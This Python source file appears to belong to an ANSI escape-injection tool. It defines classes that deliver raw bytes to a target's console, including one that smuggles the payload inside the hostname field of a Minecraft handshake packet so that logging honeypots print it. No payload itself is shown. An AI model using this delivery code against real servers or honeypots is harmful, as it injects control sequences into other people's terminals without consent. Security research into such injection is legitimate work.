import socket
import struct

# A base printer, this is the abstraction we use for an ANSI injection vulnerability
# The `print` methods pupose is to print some raw bytes to the targets console window, other parts assume that the bytes show up *during* the function, or shortly thereafter (to give the right timings)
class Printer:
    # print the bytes to the target's console
    def print(self, bytes: bytes):
        pass

    # ran when the program exits, so you can clean up
    def close(self): pass

# prints it to our own console, so you don't have to spin up another service when testing
class SelfPrinter(Printer):
    def print(self, bytes: bytes):
        print(bytes.decode())

# printer for `targets/socket_target.py`. only sends the bytes to the other side via a TCP socket
class SocketPrinter(Printer):
    def __init__(self, addr) -> None:
        super().__init__()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect(addr)
    
    def print(self, bytes: bytes):
        self.socket.sendall(bytes)

    def close(self):
        self.socket.close()

# printer that stores its payload in the hostname field of a minecraft handshake packet. this field is commonly printed by honeypots
class McHandshakePrinter(Printer):
    def __init__(self, addr) -> None:
        self.addr = addr
    
    def build_handshake(self, version: int, address: str, port: int, next: int) -> bytes:
        content = pack_varint(version) + pack_varint(len(address)) + address.encode() + struct.pack(">H", port) + pack_varint(next)
        return pack_varint(len(content) + 1) + b"\0" + content
    
    def print(self, bytes: bytes):
        #bytes = b"\n".join([x + b" - request" for x in bytes.split(b"\n")])
        packet = self.build_handshake(0, bytes.decode(), 25565, 1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(self.addr)
        sock.sendall(packet)
        sock.close()

def pack_varint(d):
    o = b""
    while True:
        b = d & 0x7F
        d >>= 7
        o += struct.pack("B", b | (0x80 if d > 0 else 0))
        if d == 0:
            break
    return o